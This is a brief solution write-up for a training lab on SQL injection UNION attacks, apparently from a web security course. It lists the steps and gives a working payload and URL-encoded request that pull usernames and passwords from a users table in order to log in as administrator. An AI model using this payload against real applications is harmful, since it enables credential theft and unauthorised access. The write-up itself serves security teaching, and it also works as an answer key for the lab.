# Lab: SQL injection UNION attack, retrieving data from other tables (Practitioner)

**Goal:** Retrieve the usernames and passwords from the `users` table and log in as administrator.

## Solution

1. Confirm number of columns and which ones accept text (usually 2 columns).
2. Retrieve data:

```
' UNION SELECT username, password FROM users--
```

3. Find the administrator password in the response.
4. Log in with `administrator` + the retrieved password.

## Payload

```
' UNION SELECT username, password FROM users--
```

Full example:

```
/filter?category='+UNION+SELECT+username,password+FROM+users--
```
